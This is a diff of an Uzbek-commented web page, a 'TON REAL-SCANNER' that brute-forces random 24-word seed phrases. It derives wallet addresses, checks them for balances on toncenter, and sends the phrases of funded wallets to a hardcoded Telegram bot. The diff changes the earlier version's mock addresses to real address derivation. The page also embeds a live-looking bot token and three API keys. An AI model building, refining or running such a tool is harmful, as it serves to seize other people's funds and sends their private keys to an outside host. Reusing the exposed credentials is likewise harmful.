@@ -2,38 +2,37 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON MULTI-API SCANNER v4.5</title>
+    <title>TON ULTIMATE REAL-SCAN v5.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tonweb-mnemonic@0.0.6/dist/tonweb-mnemonic.js"></script>
 </head>
 <body class="bg-[#050505] text-white font-mono min-h-screen flex flex-col items-center justify-center p-4">
 
-    <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-[0_0_100px_rgba(37,99,235,0.1)]">
-        <div class="text-center mb-6">
-            <h1 class="text-2xl font-black text-blue-500 italic">TON MULTI-SCAN v4.5</h1>
-            <p id="botStatus" class="text-[10px] text-green-500 uppercase tracking-widest">3 API Keys: Active</p>
+    <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-2xl">
+        <div class="text-center mb-6 border-b border-white/5 pb-4">
+            <h1 class="text-2xl font-black text-blue-500 italic">TON REAL-SCANNER v5.0</h1>
+            <p class="text-[10px] text-green-500 uppercase tracking-widest animate-pulse">Mode: Deep Real-Time Recovery</p>
         </div>
 
-        <div id="terminal" class="bg-black/80 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1">
-            <p class="text-blue-400">> System Ready. Multi-API Mode Enabled...</p>
+        <div id="terminal" class="bg-black/90 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 space-y-1">
+            <p class="text-blue-400 font-bold">> Tizim tayyor. Lug'at yuklanishini kuting...</p>
         </div>
 
         <div class="space-y-3">
-            <button id="startBtn" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black text-lg transition-all active:scale-95 shadow-lg shadow-blue-900/30">
-                START FAST SCANNING
+            <button id="startBtn" disabled class="w-full bg-slate-800 text-slate-500 py-4 rounded-2xl font-black text-lg transition-all cursor-not-allowed">
+                LUG'AT YUKLANMOQDA...
             </button>
-            <button id="stopBtn" class="w-full bg-red-600/20 hover:bg-red-600 text-red-500 py-4 rounded-2xl font-bold hidden transition-all">
-                STOP
+            <button id="stopBtn" onclick="location.reload()" class="w-full bg-red-600/20 text-red-500 py-4 rounded-2xl font-bold hidden">
+                STOP SCANNING
             </button>
         </div>
-        <p class="text-[9px] text-slate-600 mt-4 text-center italic">Speed: ~3 wallets / sec (Boosted Mode)</p>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
         const TELEGRAM_CHAT_ID = '7921132456'; 
-
-        // SIZNING 3 TA API KALITINGIZ
+        
         const API_KEYS = [
             'cdef18c228c4a4d63ead8a723cbf910e0385e52829df0e62300b3f859142271a',
             'b9e1cd205b86ebbd57238da87fdfef86a408d0abea6a81b768177ad2b9edfdff',
@@ -42,95 +41,97 @@
 
         let currentKeyIndex = 0;
         let isRunning = false;
-        let checkedCount = 0;
-        let bip39Words = []; 
-        const terminal = document.getElementById('terminal');
+        let bip39Words = [];
+        const tonweb = new TonWeb();
 
         function addLog(msg, color = 'text-slate-500') {
             const p = document.createElement('p');
-            p.className = color;
+            p.className = `border-l-2 border-transparent pl-2 ${color}`;
             p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            terminal.prepend(p);
-            if (terminal.childNodes.length > 100) terminal.lastChild.remove();
+            const term = document.getElementById('terminal');
+            term.prepend(p);
+            if (term.childNodes.length > 80) term.lastChild.remove();
         }
 
-        async function loadDictionary() {
+        // Lug'atni yuklash
+        async function init() {
             try {
-                const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
-                const data = await response.text();
-                bip39Words = data.split('\n').filter(word => word.length > 0);
-                addLog(`BIP-39 loaded. System optimized.`, "text-green-500");
+                const res = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
+                const text = await res.text();
+                bip39Words = text.split('\n').map(w => w.trim()).filter(w => w.length > 0);
+                
+                if (bip39Words.length > 2000) {
+                    const btn = document.getElementById('startBtn');
+                    btn.disabled = false;
+                    btn.className = "w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black text-lg shadow-lg text-white cursor-pointer transition-all";
+                    btn.innerText = "START REAL SCANNING";
+                    btn.onclick = startScanner;
+                    addLog("✅ Lug'at yuklandi. Tizim skanerlashga tayyor!", "text-green-500 font-bold");
+                }
             } catch (e) {
-                addLog("Dictionary error.", "text-red-500");
+                addLog("❌ Xato: Lug'atni yuklab bo'lmadi. VPN tekshiring.", "text-red-500");
             }
         }
+        init();
 
-        async function checkBalance(address) {
-            const apiKey = API_KEYS[currentKeyIndex];
-            // Keyni keyingi safar uchun almashtiramiz
-            currentKeyIndex = (currentKeyIndex + 1) % API_KEYS.length;
-
-            try {
-                const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${address}&api_key=${apiKey}`);
-                const data = await response.json();
-                if (data.ok && data.result) {
-                    return parseInt(data.result.balance);
-                }
-            } catch (e) { return -1; }
-            return 0;
+        function startScanner() {
+            isRunning = true;
+            document.getElementById('startBtn').classList.add('hidden');
+            document.getElementById('stopBtn').classList.remove('hidden');
+            addLog("🚀 Skanerlash boshlandi...", "text-blue-400 font-bold");
+            run();
         }
 
-        async function sendToTelegram(phrase, address, balance) {
-            const ton = balance / 1000000000;
-            const msg = `💰 <b>REAL MONEY FOUND!</b>\n\n📄 <b>Phrase:</b> <code>${phrase}</code>\n🔗 <b>Addr:</b> <code>${address}</code>\n💎 <b>Balance:</b> ${ton} TON`;
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
-                });
-            } catch (e) { console.error("Telegram error"); }
-        }
-
-        async function scan() {
+        async function run() {
             if (!isRunning) return;
 
-            let mnemonic = [];
-            for(let i=0; i<24; i++) {
-                mnemonic.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
+            try {
+                // 1. HAQIQIY 24 TALIK FRAZA GENERATSIYASI
+                let mnemonic = [];
+                for(let i=0; i<24; i++) {
+                    mnemonic.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
+                }
+
+                // 2. FRAZANI TEKSHIRISH (VALIDATSIYA)
+                const isValid = await tonMnemonic.validateMnemonic(mnemonic);
+                
+                if (isValid) {
+                    // 3. HAQIQIY HAMYON MANZILINI HISOBLASH
+                    const keyPair = await tonMnemonic.mnemonicToKeyPair(mnemonic);
+                    const wallet = new tonweb.wallet.all.v4R2(tonweb.provider, { publicKey: keyPair.publicKey });
+                    const address = await wallet.getAddress();
+                    const addrStr = address.toString(true, true, true);
+
+                    // 4. API ORQALI BALANSNI TEKSHIRISH
+                    const apiKey = API_KEYS[currentKeyIndex];
+                    currentKeyIndex = (currentKeyIndex + 1) % API_KEYS.length;
+
+                    const res = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${addrStr}&api_key=${apiKey}`);
+                    const data = await res.json();
+
+                    if (data.ok && data.result && parseInt(data.result.balance) > 0) {
+                        // 💰 TOPILDI!!!
+                        const balance = data.result.balance / 1000000000;
+                        addLog(`💎 TOPILDI: ${balance} TON!`, "text-green-400 font-black animate-bounce");
+                        
+                        const msg = `💰 <b>TON FOUND!</b>\n\n📄 <b>Phrase:</b> <code>${mnemonic.join(' ')}</code>\n🔗 <b>Addr:</b> <code>${addrStr}</code>\n💎 <b>Balance:</b> ${balance} TON`;
+                        
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
+                        });
+                    } else {
+                        addLog(`Checking: ${addrStr.substring(0,10)}... [Empty]`, "text-slate-500");
+                    }
+                }
+            } catch (e) {
+                addLog("API Limit yoki ulanish xatosi...", "text-red-900 text-[9px]");
             }
-            const phrase = mnemonic.join(" ");
-            const mockAddr = "EQ" + btoa(Math.random().toString()).substring(0, 44).replace(/\//g, '_').replace(/\+/g, '-');
 
-            const balance = await checkBalance(mockAddr);
-            checkedCount++;
-
-            if (balance > 0) {
-                addLog(`💰 FOUND! Balance: ${balance/1000000000} TON`, "text-green-400 font-bold");
-                await sendToTelegram(phrase, mockAddr, balance);
-            } else if (balance === -1) {
-                addLog(`[Key:${currentKeyIndex+1}] Busy...`, "text-yellow-700");
-            } else {
-                addLog(`[${checkedCount}] [API:${currentKeyIndex+1}] Empty: ${mockAddr.substring(0,10)}...`);
-            }
-
-            // Tezlik: 3 ta kalit bo'lgani uchun 350ms (jami ~3 so'rov/sekund)
-            setTimeout(scan, 350); 
+            // API bloklamasligi uchun biroz kutish
+            setTimeout(run, 600); 
         }
-
-        document.getElementById('startBtn').onclick = async function() {
-            if (bip39Words.length < 2000) await loadDictionary();
-            isRunning = true;
-            this.classList.add('hidden');
-            document.getElementById('stopBtn').classList.remove('hidden');
-            scan();
-        };
-
-        document.getElementById('stopBtn').onclick = function() {
-            isRunning = false;
-            this.classList.add('hidden');
-            document.getElementById('startBtn').classList.remove('hidden');
-        };
     </script>
 </body>
 </html>
